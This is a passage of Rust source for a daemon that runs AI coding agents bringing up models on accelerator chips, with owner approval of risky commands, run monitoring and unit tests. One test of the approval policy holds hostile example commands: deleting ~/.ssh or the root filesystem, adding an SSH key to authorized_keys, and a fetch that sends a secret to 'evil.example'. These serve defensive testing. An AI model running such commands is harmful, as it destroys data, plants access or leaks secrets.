                            a.decision = Some("cancel".into());
                        }
                    }
                    approvals_changed();
                    state.set_bringup_busy(false);
                }
            } else if action == "free-chips" {
                // Someone else's lease: say who, rather than taking their chips.
                let foreign = tokio::task::spawn_blocking(foreign_holders)
                    .await
                    .unwrap_or_default();
                if !foreign.is_empty() {
                    return Err(err(StatusCode::CONFLICT, format!(
                        "The chips are leased to {} (not TT Station). Ask them to release the lease, or release it with gozer.",
                        foreign.join(", ")
                    )));
                }
                // Pause the waiting run so the chips can be reset; it restarts below.
                let unit = runs[i].unit.clone();
                let _ = tokio::task::spawn_blocking(move || {
                    Command::new("systemctl")
                        .args(["--user", "stop", &unit])
                        .status()
                })
                .await;
                state.set_bringup_busy(false);
            } else {
                let probe = state.clone();
                if !tokio::task::spawn_blocking(move || live_ids(&load_runs(&probe)))
                    .await
                    .unwrap_or_default()
                    .is_empty()
                {
                    return Err(err(StatusCode::CONFLICT, "A bring-up is already running."));
                }
            }
            let restore = free_chips(&state, stop_serving).await?;
            // Leases whose owner is gone (a crashed run) are cleared, then the chips reset.
            let _ = tokio::task::spawn_blocking(|| {
                Command::new("gozer")
                    .arg("reconcile")
                    .stdin(Stdio::null())
                    .output()
            })
            .await;
            if let Err(e) = reset_chips(&state).await {
                eprintln!(
                    "tt-station-agentd: bring-up {id}: chip reset failed: {}",
                    e.1 .0["error"]
                );
                return Err(e);
            }
            let run = &mut runs[i];
            run.stopped = false;
            run.finished = None;
            run.exit = None;
            run.restore = restore.or(run.restore.clone());
            let (st, r, e) = (state.clone(), run.clone(), env.clone());
            let n = tokio::task::spawn_blocking(move || relaunch(&st, &e, &r))
                .await
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
                .map_err(|e| {
                    eprintln!("tt-station-agentd: bring-up {id}: relaunch failed: {e}");
                    err(StatusCode::CONFLICT, e)
                })?;
            save_runs(&state, &runs);
            state.set_bringup_busy(true);
            Ok(Json(json!({ "resumed_at_stage": n, "chips": "available" })))
        }
        "package" => {
            let env = CodexEnv::detect();
            let probe = state.clone();
            if !tokio::task::spawn_blocking(move || live_ids(&load_runs(&probe)))
                .await
                .unwrap_or_default()
                .is_empty()
            {
                return Err(err(StatusCode::CONFLICT, "A bring-up is already running."));
            }
            let run = runs[i].clone();
            let manifest = read_manifest(&run.log_dir);
            if manifest.get("stage_9_terminal_status").map(String::as_str) != Some("complete") {
                return Err(err(
                    StatusCode::CONFLICT,
                    "Package it once the vLLM stage (9) has passed.",
                ));
            }
            let stop_serving = body
                .and_then(|b| b.0["stop_serving"].as_bool())
                .unwrap_or(false);
            let restore = free_chips(&state, stop_serving).await?;
            reset_chips(&state).await?;
            let dir = package_dir(&run);
            let out = dir.join("out");
            std::fs::create_dir_all(dir.join("prompts"))
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
            let _ = std::fs::create_dir_all(&out);
            let prompt = dir.join(format!("prompts/{PACKAGE_STAGE}-package.txt"));
            std::fs::write(&prompt, package_prompt(&env, &run, &out))
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
            link_tt_model_skills();
            let args: Vec<String> = vec![
                "--replace".into(),
                format!("HF_MODEL={}", run.model),
                "--replace".into(),
                format!("MODEL_DIR={}", run.model_dir),
                "--start-index".into(),
                PACKAGE_STAGE.to_string(),
                prompt.display().to_string(),
            ];
            let (st, r, e, d) = (state.clone(), run.clone(), env.clone(), dir.clone());
            tokio::task::spawn_blocking(move || launch(&st, &e, &r, &d, &args))
                .await
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e))?;
            let run = &mut runs[i];
            run.stopped = false;
            run.finished = None;
            run.exit = None;
            run.restore = restore.or(run.restore.clone());
            // The finish line writes its exit next to its own logs; watch that one.
            run.log_dir = run.log_dir.clone();
            save_runs(&state, &runs);
            state.set_bringup_busy(true);
            state.notifier().record(Draft {
                kind: "bringup",
                title: format!("Packaging {}", short(&runs[i].model)),
                body: "Writing its tt-model.yaml, building the container and proving it serves. The build alone takes hours.".into(),
            });
            Ok(Json(json!({ "packaging": true })))
        }
        "serve" => {
            let run = runs[i].clone();
            let (repo_id, _, _) = package_result(&run);
            let Some(repo_id) = repo_id else {
                return Err(err(
                    StatusCode::CONFLICT,
                    "Package it first: there's no package to serve yet.",
                ));
            };
            if let Some(holder) = state.chips_holder() {
                return Err(err(StatusCode::CONFLICT, holder));
            }
            let stop_serving = body
                .and_then(|b| b.0["stop_serving"].as_bool())
                .unwrap_or(false);
            let life = state.lifecycle();
            if !matches!(life.phase, Phase::Idle | Phase::Failed)
                || crate::coserve::is_split(&state)
            {
                if !stop_serving {
                    return Err((
                        StatusCode::CONFLICT,
                        Json(
                            json!({ "error": "Serving it replaces what's serving now. Stop it first?", "needs_stop": true }),
                        ),
                    ));
                }
                crate::coserve::leave_split(&state).await;
                state.stop_serving().await.map_err(|e| {
                    err(
                        StatusCode::INTERNAL_SERVER_ERROR,
                        format!("couldn't stop the model: {e:#}"),
                    )
                })?;
            }
            let reset = state.clone();
            tokio::task::spawn_blocking(move || {
                reset.run_power_command(crate::power::PowerAction::ResetChips, false)
            })
            .await
            .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
            .map_err(|e| {
                err(
                    StatusCode::CONFLICT,
                    format!("couldn't reset the chips: {e:#}"),
                )
            })?;
            let log = package_dir(&run).join("serve.log");
            let path = format!(
                "{}:{}",
                home().join(".local/bin").display(),
                std::env::var("PATH").unwrap_or_default()
            );
            let out = Command::new("systemd-run")
                .args(["--user", "--collect", "--quiet"])
                .arg(format!("--unit={}", crate::orchard::HARVEST_UNIT))
                .arg(format!(
                    "--property=StandardOutput=append:{}",
                    log.display()
                ))
                .arg(format!("--property=StandardError=append:{}", log.display()))
                .arg(format!("--setenv=PATH={path}"))
                .args([
                    "tt-model",
                    "serve",
                    &repo_id,
                    "--local-only",
                    "--port",
                    &state.serving_port().to_string(),
                ])
                .stdin(Stdio::null())
                .output()
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
            if !out.status.success() {
                return Err(err(
                    StatusCode::INTERNAL_SERVER_ERROR,
                    String::from_utf8_lossy(&out.stderr).trim().to_string(),
                ));
            }
            state.notifier().record(Draft {
                kind: "bringup",
                title: format!("Starting {}", short(&repo_id)),
                body: "Serving your new package on the chips. Chat picks it up when it's ready."
                    .into(),
            });
            Ok(Json(json!({ "serving": repo_id })))
        }
        "try" => {
            // Serve the port with native vLLM, straight from tt-metal, before packaging.
            let env = CodexEnv::detect();
            let run = runs[i].clone();
            if read_manifest(&run.log_dir)
                .get("stage_9_terminal_status")
                .map(String::as_str)
                != Some("complete")
            {
                return Err(err(
                    StatusCode::CONFLICT,
                    "Try it once the vLLM stage (9) has passed.",
                ));
            }
            let probe = state.clone();
            if tokio::task::spawn_blocking(move || live_ids(&load_runs(&probe)))
                .await
                .unwrap_or_default()
                .contains(&run.id)
            {
                return Err(err(
                    StatusCode::CONFLICT,
                    "The bring-up is still using the chips. Try it when it pauses or ends.",
                ));
            }
            let stop_serving = body
                .and_then(|b| b.0["stop_serving"].as_bool())
                .unwrap_or(false);
            let dir = port_bundle(&state, &env, &run)
                .await
                .map_err(|e| err(StatusCode::CONFLICT, e))?;
            crate::native_vllm::serve_dir(&state, &dir, short(&run.model), stop_serving).await
        }
        "publish" | "list" => {
            let run = runs[i].clone();
            let (repo_id, staged, _) = package_result(&run);
            let (Some(repo_id), Some(staged)) = (repo_id, staged) else {
                return Err(err(
                    StatusCode::CONFLICT,
                    "Package it first: there's nothing to publish yet.",
                ));
            };
            let dir = package_dir(&run);
            let _ = std::fs::remove_file(dir.join("publish.exit"));
            // Push private first; listing in the public catalog is its own, explicit step.
            let cmd = if action == "publish" {
                format!(
                    "tt-model push '{}' --repo '{}' --private",
                    staged.replace('\'', ""),
                    repo_id.replace('\'', "")
                )
            } else {
                format!("tt-model publish '{}'", repo_id.replace('\'', ""))
            };
            let script = format!(
                "{cmd} >> '{0}/publish.log' 2>&1; echo $? > '{0}/publish.exit'",
                dir.display()
            );
            let path = format!(
                "{}:{}",
                home().join(".local/bin").display(),
                std::env::var("PATH").unwrap_or_default()
            );
            let out = Command::new("systemd-run")
                .args(["--user", "--collect", "--quiet"])
                .arg(format!("--unit=tt-bringup-publish-{}", run.id))
                .arg(format!("--setenv=PATH={path}"))
                .args(["sh", "-c", &script])
                .stdin(Stdio::null())
                .output()
                .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
            if !out.status.success() {
                return Err(err(
                    StatusCode::INTERNAL_SERVER_ERROR,
                    String::from_utf8_lossy(&out.stderr).trim().to_string(),
                ));
            }
            Ok(Json(json!({ action: repo_id })))
        }
        _ => Err(err(
            StatusCode::BAD_REQUEST,
            "Use stop, resume, package, serve, publish or list.",
        )),
    }
}

/// For Tori: the live (or latest) bring-up in a sentence or two.
pub fn status_line(state: &AppState) -> (Value, String) {
    let env = CodexEnv::detect();
    let runs = load_runs(state);
    let live = live_ids(&runs);
    let Some(run) = runs
        .iter()
        .rev()
        .find(|r| live.contains(&r.id))
        .or(runs.last())
    else {
        return (
            json!({ "runs": 0 }),
            "There's no bring-up yet. Start one in Bring-up, or ask me to open it.".into(),
        );
    };
    let d = describe(&env, run, live.contains(&run.id));
    let who = if run.engine == "claude" {
        "Claude Code"
    } else {
        "Codex"
    };
    let model = short(&run.model);
    let stage = d["stages"]
        .as_array()
        .and_then(|s| s.iter().find(|x| x["n"] == d["current"]))
        .and_then(|x| x["title"].as_str())
        .unwrap_or("");
    let line = match d["state"].as_str().unwrap_or("") {
        "waiting_for_you" => {
            let a = &d["approvals"][0];
            format!("{who} is waiting for you on {model}: it wants to run `{}` ({}). Say allow it or deny it.", a["command"].as_str().unwrap_or("something"), a["why"].as_str().unwrap_or(""))
        }
        "waiting_for_chips" => format!(
            "The {model} bring-up is waiting for the chips; {} has them.",
            d["chips_held_by"].as_str().unwrap_or("another job")
        ),
        "running" => format!(
            "{who} is on stage {} of {} for {model}: {stage}. {} done so far.",
            d["current"], d["total"], d["done"]
        ),
        "finished" => {
            format!("The {model} bring-up finished: every stage passed. Package it from Bring-up.")
        }
        "stopped" => format!("The {model} bring-up is stopped. Resume it from Bring-up."),
        _ => format!(
            "The {model} bring-up stopped on a problem: {}",
            d["exit_meaning"]
                .as_str()
                .unwrap_or("see Bring-up for why.")
        ),
    };
    (d, line)
}

/// For Tori: answer the oldest request waiting for a person. None: nothing waiting.
pub fn decide_waiting(decision: &str) -> Option<(String, String)> {
    let mut all = APPROVALS.lock().expect("approvals");
    let (_, a) = all.iter_mut().find(|(_, a)| a.decision.is_none())?;
    a.decision = Some(decision.to_string());
    let what = a.command.clone().unwrap_or_else(|| a.kind.clone());
    drop(all);
    approvals_changed();
    Some((decision.to_string(), what))
}

/// What [`decide_waiting`] would answer right now (the command, or the kind of request).
pub fn waiting_on() -> Option<String> {
    let all = APPROVALS.lock().expect("approvals");
    let (_, a) = all.iter().find(|(_, a)| a.decision.is_none())?;
    Some(a.command.clone().unwrap_or_else(|| a.kind.clone()))
}

/// Is a bring-up waiting on a person?
pub fn anything_waiting() -> bool {
    APPROVALS
        .lock()
        .expect("approvals")
        .iter()
        .any(|(_, a)| a.decision.is_none())
}

/// `DELETE /bringup/codex/runs/{id}` (owners): forget a run and its logs.
/// The port's code in tt-metal (`models/autoports/…`) is left alone.
pub(crate) async fn delete_run(
    State(state): State<AppState>,
    _owner: crate::routes::OwnerAuth,
    UrlPath(id): UrlPath<String>,
) -> Reply {
    let mut runs = load_runs(&state);
    let Some(i) = runs.iter().position(|r| r.id == id) else {
        return Err(err(StatusCode::NOT_FOUND, "No such run."));
    };
    let unit = runs[i].unit.clone();
    if tokio::task::spawn_blocking(move || unit_active(&unit))
        .await
        .unwrap_or(false)
    {
        return Err(err(
            StatusCode::CONFLICT,
            "Stop the run before deleting it.",
        ));
    }
    let run = runs.remove(i);
    // Only ever inside TT Station's own bring-up folder.
    let root = state.config_dir().join("bringup/codex");
    // `starts_with` compares components, so `root/../..` would pass it: no `..`.
    let walks_out = run
        .log_dir
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir));
    if run.log_dir.starts_with(&root) && run.log_dir != root && !walks_out {
        let _ = std::fs::remove_dir_all(&run.log_dir);
    }
    APPROVALS
        .lock()
        .expect("approvals")
        .retain(|(r, _)| r != &id);
    approvals_changed();
    save_runs(&state, &runs);
    Ok(Json(json!({ "deleted": id, "kept": run.model_dir })))
}

/// `POST /bringup/claude/login` (owners): open a terminal where the owner signs
/// Claude Code in (`claude auth login`). TT Station never sees the credentials.
pub(crate) async fn post_claude_login(_owner: crate::routes::OwnerAuth) -> Reply {
    let bin =
        claude_bin().ok_or_else(|| err(StatusCode::NOT_FOUND, "Claude Code isn't installed."))?;
    if !crate::desktop::has_session() {
        return Err(err(
            StatusCode::CONFLICT,
            "Sign in at the box: run `claude auth login` in a terminal there.",
        ));
    }
    let script = format!(
        "'{bin}' auth login; echo; read -p 'Signed in? Press Enter to close this window. ' _"
    );
    Command::new("gnome-terminal")
        .args([
            "--title=Sign in to Claude Code",
            "--",
            "bash",
            "-lc",
            &script,
        ])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| {
            err(
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("couldn't open a terminal: {e}"),
            )
        })?;
    Ok(Json(json!({ "opened": true })))
}

// ---------------------------------------------------------------------
// Approvals
// ---------------------------------------------------------------------

fn driver_auth(
    state: &AppState,
    id: &str,
    headers: &HeaderMap,
) -> Result<CodexRun, (StatusCode, Json<Value>)> {
    let secret = headers
        .get("x-run-secret")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    load_runs(state)
        .into_iter()
        .find(|r| r.id == id && !secret.is_empty() && r.secret == secret)
        .ok_or_else(|| err(StatusCode::UNAUTHORIZED, "not this run's driver"))
}

/// `POST /bringup/codex/runs/{id}/approvals` (driver): Codex wants to do something risky.
pub(crate) async fn post_approval(
    State(state): State<AppState>,
    UrlPath(id): UrlPath<String>,
    headers: HeaderMap,
    Json(body): Json<Value>,
) -> Reply {
    let run = driver_auth(&state, &id, &headers)?;
    let s = |k: &str| body[k].as_str().map(|v| clip(v, 2000));
    let approval = Approval {
        id: crate::pairing::issue_pair_id()[..10].to_string(),
        kind: s("kind").unwrap_or_else(|| "command".into()),
        why: s("why").unwrap_or_default(),
        command: s("command"),
        cwd: s("cwd"),
        reason: s("reason"),
        grant_root: s("grant_root"),
        created: unix_now(),
        decision: None,
    };
    APPROVALS
        .lock()
        .expect("approvals")
        .push((id.clone(), approval.clone()));
    approvals_changed();
    state.notifier().record(Draft {
        kind: "bringup",
        title: format!(
            "{} needs you: {}",
            if run.engine == "claude" {
                "Claude"
            } else {
                "Codex"
            },
            short(&run.model)
        ),
        body: format!(
            "It wants to {}: {}",
            if approval.kind == "command" {
                "run a command that ".to_string() + &approval.why
            } else {
                approval.why.clone()
            },
            approval.command.clone().unwrap_or_default()
        ),
    });
    Ok(Json(json!({ "id": approval.id })))
}

/// `POST /bringup/codex/runs/{id}/approvals/{aid}/wait` (driver): long-poll for a decision.
pub(crate) async fn post_wait(
    State(state): State<AppState>,
    UrlPath((id, aid)): UrlPath<(String, String)>,
    headers: HeaderMap,
) -> Reply {
    driver_auth(&state, &id, &headers)?;
    let find = || {
        APPROVALS
            .lock()
            .expect("approvals")
            .iter()
            .find(|(r, a)| r == &id && a.id == aid)
            .map(|(_, a)| a.decision.clone())
    };
    let deadline = tokio::time::Instant::now() + Duration::from_secs(30);
    loop {
        match find() {
            None => return Ok(Json(json!({ "decision": "cancel" }))),
            Some(Some(d)) => return Ok(Json(json!({ "decision": d }))),
            Some(None) => {}
        }
        let notified = DECIDED.notified();
        if tokio::time::timeout_at(deadline, notified).await.is_err() {
            return Ok(Json(json!({ "decision": null })));
        }
    }
}

#[derive(Debug, Deserialize)]
pub struct DecideBody {
    pub decision: String,
}

/// `POST /bringup/codex/runs/{id}/approvals/{aid}` (authed): a person decides.
pub(crate) async fn post_decide(
    State(state): State<AppState>,
    // Bring-up runs commands on the box itself, root ones too: an owner's call.
    _owner: crate::routes::OwnerAuth,
    UrlPath((id, aid)): UrlPath<(String, String)>,
    Json(body): Json<DecideBody>,
) -> Reply {
    let decision = match body.decision.as_str() {
        d @ ("accept" | "acceptForSession" | "decline") => d.to_string(),
        _ => {
            return Err(err(
                StatusCode::BAD_REQUEST,
                "Decide accept, acceptForSession or decline.",
            ))
        }
    };
    let mut all = APPROVALS.lock().expect("approvals");
    let Some((_, a)) = all.iter_mut().find(|(r, a)| r == &id && a.id == aid) else {
        return Err(err(
            StatusCode::NOT_FOUND,
            "That request is gone (the run stopped?).",
        ));
    };
    a.decision = Some(decision.clone());
    let what = format!("{id}: {}", a.command.as_deref().unwrap_or(&a.why));
    drop(all);
    crate::audit::record(&state, "bringup_approval", &what, &decision);
    approvals_changed();
    Ok(Json(json!({ "decision": decision })))
}

// ---------------------------------------------------------------------
// Watching runs
// ---------------------------------------------------------------------

/// Keep `bringup_busy` true while a run is live, record how runs end,
/// notify at each stage, and put back the model a run stopped.
pub async fn watch_forever(state: AppState) {
    let mut seen: HashMap<String, String> = HashMap::new();
    let probe = state.clone();
    let _ = tokio::task::spawn_blocking(move || {
        restore_approvals(&probe, &live_ids(&load_runs(&probe)))
    })
    .await;
    loop {
        let probe = state.clone();
        let (live, mut runs) = tokio::task::spawn_blocking(move || {
            let runs = load_runs(&probe);
            (live_ids(&runs), runs)
        })
        .await
        .unwrap_or_default();
        state.set_bringup_busy(!live.is_empty());
        let mut changed = false;
        let mut restore = None;
        let restarting = RESTARTING.lock().expect("restarting").clone();
        for run in runs.iter_mut().filter(|r| r.finished.is_none()) {
            // Stage changes → a notification.
            let pkg = package_dir(run);
            let packaging = pkg.join("prompts").is_dir() && pkg.join("manifest.txt").is_file();
            let mut manifest = read_manifest(&run.log_dir);
            manifest.extend(read_manifest(&pkg));
            let mut done: Vec<(usize, String)> = manifest
                .iter()
                .filter_map(|(k, v)| {
                    let n = k
                        .strip_prefix("stage_")?
                        .strip_suffix("_terminal_status")?
                        .parse()
                        .ok()?;
                    Some((n, v.clone()))
                })
                .collect();
            done.sort();
            let key = format!("{done:?}");
            if seen.get(&run.id).is_some_and(|k| k != &key) {
                if let Some((n, status)) = done.last() {
                    let env = CodexEnv::detect();
                    let title = if *n == PACKAGE_STAGE {
                        "Package".to_string()
                    } else {
                        env.prompts()
                            .get(n - 1)
                            .map(|p| stage_title(p))
                            .unwrap_or_else(|| format!("Stage {n}"))
                    };
                    state.notifier().record(Draft {
                        kind: "bringup",
                        title: format!(
                            "{}: {title} {}",
                            short(&run.model),
                            if status == "complete" {
                                "done"
                            } else {
                                status.as_str()
                            }
                        ),
                        body: format!(
                            "{} bring-up, stage {n} of {}.",
                            if run.engine == "claude" {
                                "Claude"
                            } else {
                                "Codex"
                            },
                            env.prompts().len()
                        ),
                    });
                }
            }
            seen.insert(run.id.clone(), key);
            if !live.contains(&run.id) && !restarting.contains(&run.id) {
                let exit_file = if packaging {
                    pkg.join("exit")
                } else {
                    run.log_dir.join("exit")
                };
                let exit = std::fs::read_to_string(exit_file)
                    .ok()
                    .and_then(|t| t.trim().parse().ok());
                // Not live and no exit file yet: the unit may just be starting.
                if exit.is_none() && unix_now().saturating_sub(run.started) < 60 {
                    continue;
                }
                run.exit = exit;
                run.finished = Some(unix_now());
                changed = true;
                // Blocked on something only a person can decide: say what, and that it needs an answer.
                let blocked =
                    done.last()
                        .filter(|(_, status)| status == "blocked")
                        .map(|(n, _)| {
                            manifest
                                .get(&format!("stage_{n}_blocked_reason"))
                                .cloned()
                                .unwrap_or_default()
                        });
                let agent = if run.engine == "claude" {
                    "Claude"
                } else {
                    "Codex"
                };
                state.notifier().record(match blocked {
                    Some(why) => Draft {
                        kind: "bringup",
                        title: format!("{}: {agent} needs an answer", short(&run.model)),
                        body: if why.is_empty() {
                            "A stage is blocked. Answer it in Bring-up and it carries on.".into()
                        } else {
                            format!("{why} Answer it in Bring-up and it carries on.")
                        },
                    },
                    None => Draft {
                        kind: "bringup",
                        title: format!(
                            "{}: {} {}",
                            short(&run.model),
                            if packaging { "packaging" } else { "bring-up" },
                            if exit == Some(0) {
                                "finished"
                            } else {
                                "stopped"
                            }
                        ),
                        body: exit
                            .and_then(|e| {
                                EXIT_MEANING
                                    .iter()
                                    .find(|(c, _)| *c == e)
                                    .map(|(_, m)| m.to_string())
                            })
                            .unwrap_or_else(|| {
                                "It stopped before finishing. Resume it from Bring-up.".into()
                            }),
                    },
                });
                restore = run.restore.take();
            }
        }
        if changed {
            save_runs(&state, &runs);
        }
        if let Some(model) = restore {
            if state.chips_holder().is_none() {
                let _ = crate::routes::begin_serve(&state, &model, false).await;
            }
        }
        tokio::time::sleep(Duration::from_secs(10)).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names() {
        assert_eq!(
            model_dir("Qwen/Qwen3.6-27B"),
            "models/autoports/qwen_qwen3_6_27b"
        );
        assert_eq!(
            stage_title(Path::new("01-functional-decoder.txt")),
            "Functional decoder"
        );
        assert_eq!(stage_title(Path::new("09-vllm.txt")), "vLLM");
        assert_eq!(stage_title(Path::new("11-tti-release.txt")), "TTI release");
    }

    #[test]
    fn events_read_codex_logs() {
        let log = [
            json!({"ts":"t1","direction":"recv","message":{"method":"item/completed","params":{"item":{"type":"commandExecution","command":"pytest tests/test_decoder.py","exitCode":0,"durationMs":1200}}}}),
            json!({"ts":"t2","direction":"recv","message":{"method":"item/completed","params":{"item":{"type":"fileChange","changes":[{"path":"/x/tt/attention.py"}]}}}}),
            json!({"ts":"t3","direction":"send","message":{"method":"turn/start"}}),
            json!({"ts":"t4","direction":"recv","message":{"method":"thread/goal/updated","params":{"goal":{"status":"complete"}}}}),
        ]
        .iter()
        .map(|v| v.to_string())
        .collect::<Vec<_>>()
        .join("\n");
        let ev = events_from_log(&log, 10);
        assert_eq!(ev.len(), 3);
        assert_eq!(ev[0]["kind"], "command");
        assert_eq!(ev[0]["exit"], 0);
        assert_eq!(ev[1]["text"], "edited attention.py");
        assert_eq!(ev[2]["text"], "goal complete");
    }

    #[test]
    fn unanswered_approvals_survive_a_restart() {
        let path = std::env::temp_dir().join(format!("tt-approvals-{}.json", std::process::id()));
        let ask = |id: &str, decision: Option<&str>| Approval {
            id: id.into(),
            kind: "command".into(),
            why: "uses sudo".into(),
            command: Some("sudo x".into()),
            cwd: None,
            reason: None,
            grant_root: None,
            created: 1,
            decision: decision.map(str::to_string),
        };
        load_approvals(path.clone(), &[]); // sets the file
        APPROVALS.lock().unwrap().extend([
            ("run1".to_string(), ask("a", None)),
            ("run1".to_string(), ask("b", Some("accept"))),
            ("gone".to_string(), ask("c", None)),
        ]);
        approvals_changed();
        APPROVALS.lock().unwrap().clear(); // the agent restarts
        load_approvals(path.clone(), &["run1".to_string()]);
        let back: Vec<String> = APPROVALS
            .lock()
            .unwrap()
            .iter()
            .map(|(_, a)| a.id.clone())
            .collect();
        assert_eq!(back, ["a"]); // unanswered, and its run still going
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn resumed_stages_read_like_any_other() {
        let base = "stage_1_thread_id=t\nstage_1_terminal_status=blocked\n";
        // Resumed and running again: no longer blocked.
        let running = parse_manifest(&format!(
            "{base}stage_1_resume_1_started_at_utc=x\nstage_1_resume_1_thread_id=t\n"
        ));
        assert_eq!(running["stage_1_terminal_status"], "");
        // Resumed and done, with its check.
        let done = parse_manifest(&format!(
            "{base}stage_1_resume_1_started_at_utc=x\nstage_1_resume_1_terminal_status=complete\nstage_1_resume_1_check_attempt_1=exit0\nstage_1_resume_1_check=pass\n"
        ));
        assert_eq!(done["stage_1_terminal_status"], "complete");
        assert_eq!(done["stage_1_check"], "pass");
        // Fix-up threads aren't the stage's outcome.
        let fix = parse_manifest("stage_2_terminal_status=complete\nstage_2_resume_1_remediation_1_terminal_status=blocked\n");
        assert_eq!(fix["stage_2_terminal_status"], "complete");
    }

    #[test]
    fn claude_commands_get_their_results() {
        let log = [
            json!({"ts":"20261008T151704Z","direction":"recv","claude":{"type":"assistant","message":{"id":"m1","content":[
                {"type":"tool_use","id":"a","name":"Bash","input":{"command":"pytest x"}},
                {"type":"tool_use","id":"b","name":"Bash","input":{"command":"ls"}}]}}}),
            json!({"ts":"20261008T151710Z","direction":"recv","claude":{"type":"user","message":{"content":[
                {"type":"tool_result","tool_use_id":"a","is_error":true,"content":"Exit code 2\nE   AssertionError: pcc 0.91"}]}}}),
            json!({"ts":"20261008T151711Z","direction":"recv","claude":{"type":"user","message":{"content":[
                {"type":"tool_result","tool_use_id":"b","content":"README.md"}]},"tool_use_result":{"stdout":"README.md","stderr":""}}}),
        ]
        .iter()
        .map(|v| v.to_string())
        .collect::<Vec<_>>()
        .join("\n");
        let ev = events_from_log(&log, 10);
        assert_eq!(ev[0]["exit"], 2);
        assert!(ev[0]["output"].as_str().unwrap().contains("pcc 0.91"));
        assert_eq!(ev[1]["exit"], 0);
        assert_eq!(ev[1]["output"], "README.md");
    }

    /// The approval policy the drivers apply (Python, run here as the box runs it).
    #[test]
    fn the_approval_policy_asks_where_it_should() {
        let t = tempfile::tempdir().unwrap();
        std::fs::write(t.path().join("codex_bringup.py"), DRIVER).unwrap();
        std::fs::write(t.path().join("permission_mcp.py"), PERMISSION_MCP).unwrap();
        let repo = t.path().join("tt-metal");
        std::fs::create_dir_all(repo.join("models")).unwrap();
        std::fs::create_dir_all(t.path().join("tt-metal-old")).unwrap();
        let check = r#"
import json, os, sys
import codex_bringup as cb, permission_mcp as pm
repo = os.environ["TT_STATION_REPO"]
asked = []
pm.ask_person = lambda kind, params, why: asked.append(why) or "decline"
def allowed(tool, args):
    asked.clear()
    return pm.decide(tool, args)["behavior"] == "allow"
# Paths: inside the repo, not a sibling that starts the same way.
assert cb.inside(repo + "/models/x.py", repo)
assert not cb.inside(repo + "-old/x.py", repo)
assert allowed("Edit", {"file_path": repo + "/models/x.py"})
assert not allowed("Edit", {"file_path": repo + "-old/x.py"}), asked
assert cb.risk("ls", repo + "-old", repo) == "runs outside the repo (" + repo + "-old)"
# Unknown tools and fetches off the documentation sites wait for a person.
assert not allowed("mcp__other__do_things", {}) and "doesn't know" in asked[0]
assert not allowed("WebFetch", {"url": "https://evil.example/?d=secret"})
assert not allowed("WebFetch", {"url": "https://huggingface.co/x?leak=1"})
assert allowed("WebFetch", {"url": "https://huggingface.co/Qwen/Qwen3-8B/blob/main/config.json"})
assert allowed("Read", {"file_path": "/etc/hostname"}) and allowed("WebSearch", {"query": "x"})
# The convenience denylist: new cheap catches, routine work untouched.
for c in ["rm -rf ~/.ssh", "rm ~/.bashrc", "rm -rf $HOME/.config", "rm -rf /*", "python3 -c 'import shutil; shutil.rmtree(p)'",
          "echo x >> ~/.bashrc", "echo k | tee -a ~/.ssh/authorized_keys", "sudo ls", "git push", "tt-smi -r"]:
    assert cb.risk(c, repo, repo), c
for c in ["pytest models/x -k y", "rm -rf build", "rm -f /tmp/x.log", "python3 -c 'print(1)'", "make -j", "echo x > out.txt", "git status"]:
    assert cb.risk(c, repo, repo) is None, c
print("ok")
"#;
        let out = std::process::Command::new("python3")
            .args([
                "-I",
                "-c",
                &format!(
                    "import sys; sys.path.insert(0, {:?}); exec(sys.stdin.read())",
                    t.path().display().to_string()
                ),
            ])
            .env("TT_STATION_REPO", &repo)
            .env("TT_STATION_POLICY", "smart")
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .and_then(|mut c| {
                use std::io::Write;
                c.stdin.take().unwrap().write_all(check.as_bytes())?;
                c.wait_with_output()
            })
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            "ok",
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    #[test]
    fn timestamps_round_trip() {
        assert_eq!(ts_unix("19700101T000000Z"), Some(0));
        assert_eq!(ts_unix("20261008T151704Z"), Some(1_791_472_624));
        let now = ts_now();
        assert!(ts_unix(&now).unwrap().abs_diff(unix_now()) <= 1);
    }

    #[test]
    fn usage_counts_each_message_once() {
        let dir = std::env::temp_dir().join(format!("tt-usage-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let log = dir.join("01-x.jsonl");
        let usage = json!({"input_tokens":10,"cache_read_input_tokens":90,"output_tokens":5});
        let early = json!({"input_tokens":10,"cache_read_input_tokens":90,"output_tokens":1});
        let lines = [
            json!({"ts":"20261008T150000Z","direction":"recv","claude":{"type":"assistant","message":{"id":"m1","usage":early,"content":[]}}}),
            json!({"ts":"20261008T150001Z","direction":"recv","claude":{"type":"assistant","message":{"id":"m1","usage":usage,"content":[]}}}),
            json!({"ts":"20261008T150100Z","direction":"recv","claude":{"type":"result","total_cost_usd":0.4}}),
            json!({"ts":"20261008T150200Z","direction":"recv","message":{"method":"thread/tokenUsage/updated","params":{"threadId":"t","tokenUsage":{"total":{"inputTokens":1000,"outputTokens":50}}}}}),
        ];
        std::fs::write(
            &log,
            lines.iter().map(|l| format!("{l}\n")).collect::<String>(),
        )
        .unwrap();
        let u = stage_usage(std::slice::from_ref(&log)).unwrap();
        assert_eq!(u["tokens_in"], 1100);
        assert_eq!(u["tokens_out"], 55);
        assert_eq!(u["cost_usd"], 0.4);
        assert_eq!(
            u["last_at"].as_u64().unwrap() - u["started_at"].as_u64().unwrap(),
            120
        );
